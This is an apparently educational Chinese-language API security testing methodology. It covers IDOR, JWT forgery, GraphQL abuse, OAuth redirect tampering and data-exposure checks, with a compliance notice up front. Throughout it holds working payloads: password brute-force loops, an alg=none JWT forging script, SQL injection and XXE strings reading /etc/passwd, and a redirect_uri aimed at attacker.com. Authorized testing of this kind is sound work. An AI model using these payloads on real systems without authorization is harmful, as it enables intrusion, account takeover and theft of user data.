# API安全测试方法论

> **合规声明：** 本文档所述测试方法和技术仅适用于**已获得明确书面授权**的安全评估场景。API测试可能涉及大量请求，请控制速率避免对目标造成拒绝服务。未经授权测试目标API可能违反法律法规，测试者应自行承担相关责任。

---

## 1. 概述

API（应用程序接口）是现代Web应用的通信核心，也是漏洞高发区。相比传统的Web页面攻击，API安全测试更侧重于：

- **认证与授权**：身份验证机制和权限控制
- **数据暴露**：接口返回超出预期的敏感数据
- **业务逻辑**：参数篡改和流程绕过
- **配置问题**：CORS、速率限制、安全头缺失

据HackerOne 2024年报告，API相关漏洞占所有高危漏洞的**45%以上**。系统化的API测试流程能够显著提高漏洞发现效率。

---

## 2. API测试总览

```
API测试流程
    │
    ├── 1. API发现与枚举
    │     ├── 文档发现（Swagger/OpenAPI/GraphiQL）
    │     ├── JS提取（参见02-js-analysis.md）
    │     └── 目录爆破
    │
    ├── 2. 认证与授权测试
    │     ├── 未授权访问
    │     ├── IDOR（水平/垂直越权）
    │     ├── JWT攻击
    │     └── 认证绕过
    │
    ├── 3. 请求处理测试
    │     ├── 方法混淆
    │     ├── Content-Type切换
    │     ├── 参数Fuzzing
    │     └── 版本号遍历
    │
    ├── 4. 业务逻辑测试
    │     ├── 速率限制
    │     ├── 批量操作滥用
    │     └── 竞态条件
    │
    ├── 5. GraphQL专项测试
    │     ├── Introspection查询
    │     ├── 深度查询攻击
    │     ├── 批量查询（Batching）
    │     └── 字段级授权
    │
    └── 6. 数据暴露检查
          ├── 响应数据过度暴露
          ├── 错误信息泄露
          └── 调试接口残留
```

---

## 3. REST API测试

### 3.1 API发现与枚举

#### 3.1.1 文档发现

API文档是理解API结构和功能的最快途径，但也可能是攻击者的地图。

```bash
# 常见Swagger/OpenAPI文档路径
paths=(
  "/swagger.json"
  "/swagger/v1/swagger.json"
  "/api/swagger.json"
  "/api/docs"
  "/api/v1/openapi.json"
  "/openapi.json"
  "/swagger-ui.html"
  "/api/swagger-ui.html"
  "/doc/"
  "/docs/"
  "/api/doc/"
  "/api/v1/doc/"
)

for path in "${paths[@]}"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://example.com$path")
  if [ "$status" != "404" ]; then
    echo "[$status] https://example.com$path"
  fi
done
```

#### 3.1.2 常见REST路径模式

```
# 标准RESTful API模式
GET    /api/v1/users          # 获取用户列表
GET    /api/v1/users/{id}     # 获取单个用户
POST   /api/v1/users          # 创建用户
PUT    /api/v1/users/{id}     # 更新用户
DELETE /api/v1/users/{id}     # 删除用户
PATCH  /api/v1/users/{id}     # 部分更新用户

# 需要特别关注的非标路径
/api/v1/users/export          # 数据导出
/api/v1/users/search          # 搜索（可能越权）
/api/v1/users/admin           # 管理操作
/api/v1/users/batch           # 批量操作
/api/v1/internal/*            # 内部接口
/api/v1/debug/*               # 调试接口
```

#### 3.1.3 API端点爆破

```bash
# 使用ffuf枚举API端点
ffuf -u https://example.com/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -fc 404,403 -t 50 -o api_endpoints.json

# 嵌套路径枚举
ffuf -u https://example.com/api/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -fc 404

# 带参数的端点枚举
ffuf -u https://example.com/api/v1/users?FUZZ=1 \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fc 400,404
```

### 3.2 未授权访问检测

未授权访问是最常见的API安全问题之一。

#### 3.2.1 基础检测方法

```bash
# 方法1：直接访问需要认证的接口（不带Token）
curl -sv https://example.com/api/v1/admin/users 2>&1 | head -30

# 方法2：使用空Token/过期Token
curl -sv -H "Authorization: Bearer " https://example.com/api/v1/admin/users 2>&1

# 方法3：使用常见弱Token
curl -sv -H "Authorization: Bearer admin" https://example.com/api/v1/admin/users
curl -sv -H "Authorization: Bearer test" https://example.com/api/v1/admin/users
curl -sv -H "Authorization: Bearer 123456" https://example.com/api/v1/admin/users

# 方法4：删除Authorization头
curl -sv -H "Authorization:" https://example.com/api/v1/admin/users 2>&1
```

#### 3.2.2 请求头篡改

```bash
# 尝试通过请求头绕过权限检查
# X-Forwarded-For: 127.0.0.1 (模拟内网来源)
# X-Forwarded-Host: internal-api.com
# X-Auth-Token: admin
# Authorization: Basic YWRtaW46YWRtaW4=
# X-Admin: true
# X-Role: admin
# X-Permission: *

HEADERS=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Real-IP: 127.0.0.1"
  "X-Forwarded-Host: localhost"
  "X-Auth-Token: admin"
  "X-Admin: true"
  "X-Role: admin"
  "X-Permission: *"
  "X-Internal: true"
  "X-Originating-IP: 127.0.0.1"
  "X-Remote-IP: 127.0.0.1"
  "X-Client-IP: 127.0.0.1"
  "True-Client-IP: 127.0.0.1"
)

for header in "${HEADERS[@]}"; do
  echo "--- $header ---"
  curl -sv -H "$header" https://example.com/api/v1/admin/users 2>&1 | grep -E "HTTP/|^{"
done
```

### 3.3 请求方法混淆

服务器端可能对某些HTTP方法缺少正确的权限校验。

```bash
# 枚举API端点支持的所有方法
curl -sv -X OPTIONS https://example.com/api/v1/users
# 检查 Allow 头

# 将POST切换为GET（跳过硬编码的POST检查）
curl -sv "https://example.com/api/v1/users/1/delete"  # GET请求本应被阻止

# 将GET切换为POST
curl -X POST "https://example.com/api/v1/users" -d ""

# 使用PUT创建资源（标准应为POST）
curl -X PUT "https://example.com/api/v1/users" -H "Content-Type: application/json" -d '{"name":"test"}'

# 使用PATCH绕过PUT的完整验证
curl -X PATCH "https://example.com/api/v1/users/1" -H "Content-Type: application/json" -d '{"role":"admin"}'

# 使用DELETE但参数名伪装
curl -X DELETE "https://example.com/api/v1/users?id=1"
```

### 3.4 Content-Type切换测试

不同Content-Type可能导致服务器采用不同的处理逻辑，一些校验可能在特定格式下被绕过。

```bash
# JSON → URL编码
curl -X POST https://example.com/api/v1/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'username=admin&password=admin'

# URL编码 → JSON
curl -X POST https://example.com/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'

# JSON → XML
curl -X POST https://example.com/api/v1/login \
  -H "Content-Type: application/xml" \
  -d '<user><username>admin</username><password>admin</password></user>'

# JSON → 纯文本
curl -X POST https://example.com/api/v1/login \
  -H "Content-Type: text/plain" \
  -d '{"username":"admin","password":"admin"}'

# Multipart形式
curl -X POST https://example.com/api/v1/upload \
  -F "file=@payload.txt;type=image/jpeg"
```

### 3.5 API版本号遍历

```bash
# 遍历API版本号发现废弃/内部版本的API
for version in v1 v2 v3 v4 v5 beta dev test staging latest; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://example.com/api/$version/users")
  if [ "$status" != "404" ]; then
    echo "[$status] /api/$version/users"
  fi
done

# 同时遍历子域名（可能存在不同版本部署在不同子域名）
for sub in api api-v1 api-v2 api-beta api-dev api-internal; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://$sub.example.com/api/users")
  if [ "$status" != "404" ] && [ "$status" != "000" ]; then
    echo "[$status] https://$sub.example.com/api/users"
  fi
done
```

### 3.6 IDOR检测方法论

IDOR（Insecure Direct Object Reference）是API测试中最常见的漏洞类型。

#### 3.6.1 水平越权

```bash
# 用自己的Token访问其他用户的数据
# 1. 获取当前用户的ID
curl -sv -H "Authorization: Bearer USER_A_TOKEN" https://example.com/api/v1/profile
# {"id": 1001, "name": "User A"}

# 2. 替换ID为其他用户
curl -sv -H "Authorization: Bearer USER_A_TOKEN" https://example.com/api/v1/profile?id=1002
curl -sv -H "Authorization: Bearer USER_A_TOKEN" https://example.com/api/v1/profile/1002
curl -sv -H "Authorization: Bearer USER_A_TOKEN" https://example.com/api/v1/user/1002/info

# 3. UUID枚举模式
# 如果是UUID，检查是否可预测（如时间戳生成）
# v1 UUID：基于时间戳，可猜测
curl -sv -H "Authorization: Bearer USER_A_TOKEN" "https://example.com/api/v1/order?id=f47ac10b-58cc-1e67-8560-000000000001"
```

#### 3.6.2 垂直越权

```bash
# 使用低权限账户尝试访问高权限接口
# 1. 普通用户尝试访问管理员接口
curl -sv -H "Authorization: Bearer NORMAL_USER_TOKEN" https://example.com/api/v1/admin/users

# 2. 参数注入提升权限
curl -X POST https://example.com/api/v1/users/create \
  -H "Authorization: Bearer NORMAL_USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin"}'  # 尝试赋予自己管理员角色

# 3. 修改请求体中的角色/权限字段
curl -X PUT https://example.com/api/v1/users/2001 \
  -H "Authorization: Bearer NORMAL_USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","is_admin":true,"permissions":["*"]}'
```

### 3.7 速率限制与批量滥用测试

```bash
#!/bin/bash
# rate_limit_test.sh

TARGET="https://example.com/api/v1/login"
echo "=== 速率限制测试 ==="
for i in $(seq 1 20); do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"username":"test","password":"test"}')
  echo "请求#$i: HTTP $status"
  if [ "$status" = "429" ] || [ "$status" = "403" ]; then
    echo "=== 速率限制在请求#$i触发 ==="
    break
  fi
  sleep 0.1
done
```

**批量操作用例：**

```bash
# 批量密码尝试（无速率限制时存在爆破风险）
for pass in $(cat passwords.txt); do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://example.com/api/v1/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$pass\"}")
  if [ "$status" = "200" ]; then
    echo "[SUCCESS] password: $pass"
    break
  fi
done

# 批量ID枚举
for id in $(seq 1 100); do
  curl -s -H "Authorization: Bearer TOKEN" \
    "https://example.com/api/v1/users/$id" | jq -c '{id: .id, name: .name, email: .email}' 2>/dev/null
done
```

---

## 4. GraphQL安全测试

GraphQL是一种灵活的API查询语言，但其灵活性也带来了独特的安全风险。

### 4.1 Introspection查询

Introspection是GraphQL的自我描述能力，但生产环境通常应该禁用。

```bash
# 检测Introspection是否开启
curl -X POST https://example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'

# 如果返回了schema信息，说明introspection未禁用
# 查询所有Query类型
curl -X POST https://example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{fields{name args{name type{name}}}}}}"}'

# 查询所有Mutation类型
curl -X POST https://example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{mutationType{fields{name args{name type{name}}}}}}"}'
```

### 4.2 批量查询攻击（Batching Attack）

GraphQL允许在单个请求中发送多个查询，这可能绕过速率限制。

```bash
# batching攻击示例：同时在单个请求中尝试多个密码
curl -X POST https://example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query($p1:String!){login(password:$p1){token}}",
    "variables": {"p1":"password1"}
  }'

# 使用别名进行批量化查询
curl -X POST https://example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{
      a:login(username:\"admin\",password:\"password1\"){token}
      b:login(username:\"admin\",password:\"password2\"){token}
      c:login(username:\"admin\",password:\"123456\"){token}
      d:login(username:\"admin\",password:\"admin\"){token}
      e:login(username:\"admin\",password:\"password\"){token}
    }"
  }'
```

### 4.3 深度查询攻击（Depth Query Attack）

恶意构造深度嵌套的查询可能导致服务端资源耗尽。

```graphql
# 构造深度递归查询
query deepQuery {
  user(id: 1) {
    posts {
      comments {
        user {
          posts {
            comments {
              user {
                posts {
                  comments {
                    text
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}

# 循环引用利用（如果schema中存在自引用关系）
query circularQuery {
  allUsers {
    friends {
      friends {
        friends {
          friends {
            name
          }
        }
      }
    }
  }
}
```

### 4.4 字段级授权测试

```graphql
# 尝试查询不应该被当前用户访问的字段
# 如：普通用户尝试查询其他用户的密码哈希
query {
  user(id: 2) {
    id
    username
    passwordHash   # 这个字段应该有权限控制
    email
    phone
    creditCard {
      number       # 敏感字段
      cvv
    }
    internalNote   # 内部备注字段
  }
}

# 条件字段注入（检查是否存在未授权暴露的字段）
query {
  __type(name: "User") {
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

### 4.5 GraphQL工具推荐

```bash
# Graphw00f - GraphQL指纹识别
python3 graphw00f.py -d -t https://example.com/graphql

# InQL - BurpSuite的GraphQL插件（推荐）
# Burp → BApp Store → InQL Scanner

# Clairvoyance - GraphQL端点爆破
clairvoyance https://example.com/graphql -o schema.json

# GraphQLmap - GraphQL交互式测试
python3 graphqlmap.py -u https://example.com/graphql
```

---

## 5. API认证机制专项测试

### 5.1 JWT攻击

#### 5.1.1 签名算法混淆

```python
#!/usr/bin/env python3
# jwt_attack.py - JWT攻击脚本

import jwt
import base64
import json

# 将alg从RS256改为HS256
# 当服务器使用RS256但接受HS256时，可使用公钥作为HMAC密钥

def decode_jwt(token):
    """解码JWT（不验证签名）"""
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    return header, payload

def alg_none_attack(header, payload):
    """alg=none攻击"""
    header['alg'] = 'none'
    header_enc = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
    payload_enc = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
    return f"{header_enc}.{payload_enc}."

def alg_HS256_attack(header, payload, public_key):
    """RS256→HS256混淆攻击（使用公钥签名）"""
    header['alg'] = 'HS256'
    # 需要获取服务器的公钥
    token = jwt.encode(payload, public_key, algorithm='HS256')
    return token
```

```bash
# JWT工具使用
# jwt_tool - 完整的JWT测试工具
python3 jwt_tool.py https://example.com/api/v1/login \
  -rh "Authorization: Bearer <TOKEN>" \
  -M pb   # 测试Payload爆破
```

#### 5.1.2 JWT常见弱密钥爆破

```bash
# JWT密钥爆破
# 使用john或hashcat（需要先提取JWT签名）
# 或者使用 jwt_tool
python3 jwt_tool.py -C -d /usr/share/wordlists/rockyou.txt <JWT_TOKEN>

# 常见弱密钥列表：
# secret, secret123, password, admin, 
# change_me, changeme, 123456, qwerty
```

### 5.2 Cookie认证问题

```bash
# 检查Cookie安全属性
curl -sv https://example.com/api/v1/login \
  -X POST -d "username=admin&password=admin" 2>&1 | grep -i "Set-Cookie"

# 应关注：
# - Secure标志：仅HTTPS传输
# - HttpOnly标志：禁止JS访问
# - SameSite标志：Lax/Strict/None
# - Domain和Path范围是否过宽
# - 是否有固定SessionID
```

### 5.3 OAuth 2.0测试

```bash
# 测试OAuth端点
# 1. 重定向URI绕过
curl -v "https://example.com/oauth/authorize?response_type=code&client_id=xxx&redirect_uri=https://attacker.com"

# 2. CSRF攻击（缺少state参数）
# 检查authorize请求中是否包含state参数

# 3. Token泄露
# 检查回调URL中Token是否出现在Referer头或日志中

# 4. scope提升
# 修改scope参数请求更高权限
curl "https://example.com/oauth/authorize?response_type=code&client_id=xxx&scope=admin"
```

---

## 6. 响应分析

### 6.1 错误信息泄露

```bash
# 触发各种错误以获取调试信息

# 参数类型错误
curl -X POST https://example.com/api/v1/users \
  -H "Content-Type: application/json" \
  -d '{"id":"not_a_number"}'

# 过大输入
curl -X POST https://example.com/api/v1/users \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"$(python3 -c 'print("A"*100000)')\"}"

# SQL注入尝试（观察错误信息是否含数据库类型）
curl -X POST https://example.com/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR 1=1--","password":"test"}'

# XML外部实体（XXE）
curl -X POST https://example.com/api/v1/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

### 6.2 数据过度暴露

```bash
# 检查响应体中的敏感字段
curl -s https://example.com/api/v1/users/me \
  -H "Authorization: Bearer TOKEN" | jq '.'

# 需关注的敏感字段
# password, passwordHash, password_hash
# ssn, ssnNumber, socialSecurityNumber
# creditCard, cardNumber, cvv, ccv
# secret, apiKey, api_secret
# internalIP, privateIP
# phone, phoneNumber, mobile
# email (如果其他用户的email也暴露)
```

### 6.3 批量数据检测

```bash
# 检查是否有未分页的批量数据泄露
curl -s "https://example.com/api/v1/users" \
  -H "Authorization: Bearer TOKEN" | jq '. | length'

# 如果一次性返回大量用户数据（无分页），属于数据过度暴露

# 尝试绕过页面限制
curl -s "https://example.com/api/v1/users?limit=10000"
curl -s "https://example.com/api/v1/users?page=1&size=10000"
curl -s "https://example.com/api/v1/users?offset=0&max=999999"
```

---

## 7. 自动化测试工具箱

### 7.1 推荐工具

| 工具 | 用途 | 类型 |
|------|------|------|
| **Postman** | API调试与集合测试 | GUI |
| **Burp Suite** | Web/API代理 + 插件 | GUI |
| **ffuf** | 端点与参数Fuzzing | CLI |
| **Arjun** | 参数发现 | CLI |
| **Kiterunner** | API路径爆破 | CLI |
| **Autorize** | Burp插件，越权检测 | Burp插件 |
| **GraphQL Raider** | Burp插件，GraphQL测试 | Burp插件 |
| **InQL** | GraphQL扫描器 | Burp插件 |
| **jwt_tool** | JWT攻击工具 | CLI |
| **Nuclei** | 可编写模板的漏洞扫描器 | CLI |

### 7.2 Nuclei API测试模板示例

```yaml
# api-info-leak.yaml
id: api-info-leak

info:
  name: API Information Leakage
  author: tester
  severity: medium

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/swagger.json"
      - "{{BaseURL}}/swagger.json"
      - "{{BaseURL}}/api/v1/docs"
    
    matchers:
      - type: word
        words:
          - "swagger"
          - "openapi"
          - "apiVersion"
        part: body
```

### 7.3 自动越权检测脚本

```python
#!/usr/bin/env python3
"""auto_idor.py - 自动IDOR检测脚本"""

import requests
import sys

BASE_URL = sys.argv[1]
USER_A_TOKEN = sys.argv[2]
USER_B_TOKEN = sys.argv[3]

# 测试场景：使用User A的Token访问User B的资源
endpoints = [
    f"/api/v1/user/profile",
    f"/api/v1/user/orders",
    f"/api/v1/user/settings",
]

for endpoint in endpoints:
    # 先获取User B的资源ID
    b_resp = requests.get(
        f"{BASE_URL}{endpoint}",
        headers={"Authorization": f"Bearer {USER_B_TOKEN}"}
    )
    b_data = b_resp.json()
    
    # 用User A的Token访问User B的资源
    a_resp = requests.get(
        f"{BASE_URL}{endpoint}",
        headers={"Authorization": f"Bearer {USER_A_TOKEN}"}
    )
    
    if a_resp.status_code == 200 and a_resp.text != b_resp.text:
        print(f"[POTENTIAL IDOR] {endpoint}")
        print(f"  User B response status: {b_resp.status_code}")
        print(f"  User A response status: {a_resp.status_code}")
```

---

## 8. 常见API漏洞速查表

| 漏洞类型 | 检测方法 | 预期结果 |
|---------|---------|---------|
| 未授权访问 | 移除Token访问需要认证的端点 | 正常返回数据而不是401/403 |
| IDOR | 替换资源ID为其他用户的ID | 获取到不属于自己的数据 |
| JWT None | 修改alg为none | 服务器接受无签名Token |
| 方法混淆 | 使用非常见HTTP方法 | 绕过权限校验 |
| GraphQL Introspection | 发送introspection查询 | 返回完整的Schema |
| 速率限制缺失 | 快速连续发送大量请求 | 全部成功（无429） |
| 数据过度暴露 | 检查响应体中的多余字段 | 包含密码、Token等敏感字段 |
| 批量数据泄露 | 请求无分页的列表接口 | 一次性返回所有记录 |
| 版本绕过 | 使用v1替代v2或反之 | 存在较少安全防护的旧版 |
| 参数污染 | 提交同名参数 | 后端拼接处理导致逻辑错误 |

---

## 9. 注意事项

### 请求频率控制
```bash
# 建议请求间隔
# API端点测试：100ms-200ms间隔
# 密码爆破：至少500ms（或根据平台规则）
# 目录爆破：50-100ms
# 不建议使用 -rate 过高，可能导致IP被封或服务中断
```

### 测试边界
- 不得对未授权的第三方API进行测试
- 发现敏感数据泄露后立即停止并报告
- 严格遵循众测平台的API测试规则
- 部分平台不允许自动化API测试

### 日志记录
```bash
# 记录所有请求便于复现和报告
# 建议格式
# [时间] 方法 URL | Header | Body | 响应状态码 | 响应体摘要
# 示例：
# [2024-01-15 10:30:00] GET /api/v1/users/1001 | Auth: Bearer *** | 200 | {"id":1001,"name":"Test"}
```

---

> **最终提醒：** API是企业的核心数据通道，API安全测试的目标是帮助加固而不是破坏。发现漏洞后请负责任地按照平台漏洞披露流程报告，切勿利用漏洞获取未授权数据或造成实质损害。

---

## 10. 参考文献

- OWASP API Security Top 10: https://owasp.org/www-project-api-security/
- GraphQL Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- JWT Attack Playbook: https://github.com/ticarpi/jwt_tool/wiki
- HackerOne API Testing: https://www.hackerone.com/start-hacking/api-security-testing
- PortSwigger API Testing: https://portswigger.net/web-security/api
